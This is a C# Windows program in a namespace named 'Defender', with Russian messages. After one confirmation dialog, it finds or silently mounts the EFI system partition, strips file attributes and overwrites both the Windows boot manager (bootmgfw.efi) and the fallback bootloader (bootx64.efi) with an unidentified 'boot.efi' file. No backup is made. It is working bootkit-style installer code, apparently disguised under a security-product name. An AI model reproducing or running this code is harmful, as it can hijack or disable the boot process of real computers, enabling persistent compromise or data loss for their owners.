using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Windows.Forms;

namespace Defender
{
class Program
{
    [STAThread]
    static void Main()
    {
	DialogResult result = MessageBox.Show(
            "Вы уверены, что хотите продолжить?",  // Текст сообщения
            "Предупреждение",                      // Заголовок окна
            MessageBoxButtons.YesNo,               // Кнопки "Да" и "Нет"
            MessageBoxIcon.Warning                 // Иконка предупреждения
        );

        if (result == DialogResult.No)
        {
            Console.WriteLine("Операция отменена.");
            return;
        }
        try
        {
            string efiPartition = GetEfiPartition();
            if (string.IsNullOrEmpty(efiPartition))
            {
                Console.WriteLine("Раздел EFI не найден. Пробуем примонтировать...");
                efiPartition = MountEfiPartition();
                if (string.IsNullOrEmpty(efiPartition))
                {
                    Console.WriteLine("Не удалось найти или примонтировать EFI-раздел.");
                    return;
                }
            }

            string bootx64Path = Path.Combine(efiPartition, "EFI", "BOOT", "bootx64.efi");
            string bootmgfwPath = Path.Combine(efiPartition, "EFI", "Microsoft", "Boot", "bootmgfw.efi");

            RemoveWriteProtection(bootx64Path);
            RemoveWriteProtection(bootmgfwPath);

            byte[] bootEfiData = GetEmbeddedBootFile();
            if (bootEfiData == null)
            {
                Console.WriteLine("Ошибка: boot.efi не найден в ресурсах!");
                return;
            }

            File.WriteAllBytes(bootx64Path, bootEfiData);
            File.WriteAllBytes(bootmgfwPath, bootEfiData);

            Console.WriteLine("Файлы успешно заменены!");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Ошибка: " + ex.Message);
        }
    }

    static byte[] GetEmbeddedBootFile()
    {
        return File.ReadAllBytes("boot.efi");
    }

    static string GetEfiPartition()
    {
        string efiPartition = "";
        ManagementObjectSearcher searcher = new ManagementObjectSearcher(
            "SELECT * FROM Win32_DiskPartition WHERE Type LIKE '%EFI%'");

        foreach (ManagementObject partition in searcher.Get())
        {
            string deviceId = partition["DeviceID"].ToString();

            ManagementObjectSearcher logicalSearcher = new ManagementObjectSearcher(
                string.Format("ASSOCIATORS OF {{Win32_DiskPartition.DeviceID='{0}'}} WHERE AssocClass=Win32_LogicalDiskToPartition", deviceId));

            foreach (ManagementObject logicalDisk in logicalSearcher.Get())
            {
                efiPartition = logicalDisk["DeviceID"].ToString() + "\\";
                return efiPartition;
            }
        }

        return efiPartition;
    }

    static string MountEfiPartition()
    {
        try
        {

                    string driveLetter = "Z:";

                    Process mountProcess = new Process();
                    mountProcess.StartInfo.FileName = "cmd.exe";
                    mountProcess.StartInfo.Arguments = string.Format("/c mountvol {0} /s", driveLetter);
                    mountProcess.StartInfo.UseShellExecute = false;
                    mountProcess.StartInfo.CreateNoWindow = true;
                    mountProcess.Start();
                    mountProcess.WaitForExit();

                    return driveLetter + "\\";
        }
        catch (Exception ex)
        {
            Console.WriteLine("Ошибка при монтировании EFI: " + ex.Message);
        }

        return "";
    }

    static void RemoveWriteProtection(string filePath)
    {
        if (File.Exists(filePath))
        {
            File.SetAttributes(filePath, FileAttributes.Normal);
        }
    }
}
}
